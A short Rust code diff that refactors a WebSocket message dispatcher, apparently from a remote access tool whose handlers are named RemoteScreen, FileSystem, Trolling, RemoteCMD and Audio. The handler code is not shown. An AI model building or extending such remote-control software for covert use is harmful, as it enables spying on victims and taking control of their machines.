@@ -1,5 +1,4 @@
 use std::net::TcpStream;
-
 use tungstenite::stream::MaybeTlsStream;
 use tungstenite::WebSocket;
 
@@ -47,10 +46,11 @@ impl MessageType {
 	}
 }
 
-pub async fn handle_message(message: MessageType, payload: &[u8], socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
+pub fn handle_message(message: MessageType, payload: &[u8], socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
+	dbg!(&payload,&message);
 	match message {
-		MessageType::RemoteScreen => handle_remote_screen(payload, socket).await,
-		MessageType::FileSystem =>  handle_file_system(payload) ,
+		MessageType::RemoteScreen => handle_remote_screen(payload, socket).unwrap(),
+		MessageType::FileSystem =>  handle_file_system(payload),
 		MessageType::Trolling => handle_trolling(payload),
 		MessageType::RemoteCMD => handle_remote_cmd(payload, socket),
 		MessageType::Audio => handle_audio(payload),
